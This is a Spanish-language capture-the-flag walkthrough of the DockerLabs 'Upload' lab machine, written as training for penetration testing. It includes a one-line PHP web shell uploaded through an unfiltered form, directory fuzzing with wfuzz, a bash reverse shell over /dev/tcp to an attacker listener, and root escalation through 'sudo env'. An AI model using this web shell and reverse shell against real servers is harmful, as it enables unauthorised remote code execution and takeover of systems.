![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-banner.png)

[Maquina](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ)   \   [Dockerlabs](https://dockerlabs.es/)


## Reconocimiento

Comenzamos con un escaneo de `nmap` a todos los puertos de la maquina vulnerable en busca de puertos abiertos.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.2 -oG allPorts
________________________________________________________________

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

Solo hay un puerto abierto, el **puerto 80**. Este corresponde a un servicio http(Hyper Text Transfer Protocol) o servicio web en pocas palabras.

Ahora hacemos un segundo escaneo con `nmap` sobre este puerto abierto con un conjunto de scripts basicos de reconocimientos que trae por defecto nmap con el parametro `-sC` he incluimos el parametro `-sV` para que nos detecte la version del servicio que corre en dicho puerto. Estos dos se pueden escribir como `-sCV`.

```shell
nmap -p80 -sCV 172.17.0.2 -oN targeted
______________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
```
En los resultados del escaneo podemos ver que dentro del **puerto 80** se aloja una pagina web que, tal parece, nos deja subir archivos al servidor.

Visualizamos la pagina web.

![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img1.png)

Al tener la oportunidad de subir archivos a una web, en lo primero que pensariamos es en subir un archivo *php* con el que podamos ejecutar comandos dentro de la maquina atraves de un paramentro definido en el script. Esto sera asi en caso de que la maquina no aplique ningun tipo de sanitizacion sobre los tipos de archivos que se pueden subir.

Creamos un archivo *php* con un paramentro `cmd` al cual le pasaremos los comandos que deceemos ejecutar.
```shell
echo "<?php system(\$_GET['cmd']); ?>" >> test.php
```

El archivo se logra subir sin ningun problema por lo que, no se esta aplicando ningun tipo de sanitizacion en el servidor.

Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo. Para ello, haremos uso de `wfuzz` para encontrar esa ruta en donde fue guardado nuestro archivo. Con el parametro `--hc=404` excluimos todos las respuestas HTTP con codigo 404 (Not Found) que pueda regresar el servidor.

```shell
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://172.17.0.2/FUZZ
________________________________________________________________________________________________________________
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/FUZZ
Total requests: 1273832

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        53 L     104 W      1361 Ch     "# directory-list-2.3-big.txt"
...
000000164:   301        9 L      28 W       310 Ch      "uploads"
```

`Wfuzz` nos ha econtrado un directorio llamado **"uploads"**.

Si revisamos ese directorio podremos ver que ahi se encuntra alojado nuestro archivo *test.php*.

![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img2.png)

Nos dirijimos directamente atraves de la URL a nuestro archivo php y hacemos un llamado al parametro que predefinimos anteriormente para que ejecute el comando `id` en la maquina.

```
http://172.17.0.2/uploads/test.php?cmd=id
```

![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img3.png)
Al hacer esto podremos observar la respuesta del servidor ante el comando `id` por lo que el archivo funciona y el servidor interpreta de forma correcta las peticiones hechas atraves del archivo php. Sabiendo esto, podemos intentar entablar una revershell del servidor a nuestra maquina atacante. 

## Explotacion

Nos colocamos en escucha con `netcat` por el **puerto 443** en espera de la conexion.
```shell
nc -nlvp 443
```
Y atraves del parametro `cmd` de nuestro archivo le hacemos la peticion al servidor para que establezca una conexion con nuestra maquina atacante. Cambiamos el caracter `&` por su expresion en URL(`%26`), para que pueda ser interpretado por el servidor:
```shell
http://172.17.0.2/uploads/test.php?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```
![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img4.png)
Y hemos logrado ganar acceso como el usuario *www-data*.

## Escalada de privilegios

Ejecutamos un `sudo -l` para ver si existe algun comando que podamos ejecutar con altos privilegios.

```shell
sudo -l
________________________
...
User www-data may run the following commands on 41e845320485:
    (root) NOPASSWD: /usr/bin/env
```
Vemos que el usuario *www-data* puede ejecutar `/usr/bin/env` como *root* sin necesidad de proporcionar alguna credencial. Por ende, ejecutamos una **bash** atraves del comando `env` como *root*.
```shell
sudo env /bin/bash
```

Y comprobamos con el comando `whoami` o `id` que ya somos usuario *root*.

![image](https://github.com/x4nderht/CTFs/blob/effd1af3fa859eb27c3a2ecb55b427217151c9f0/DockerLabs/Upload/imgs/upload-img5.png)

##

De esta forma hemos resuelto la maquina Upload de DockerLabs.






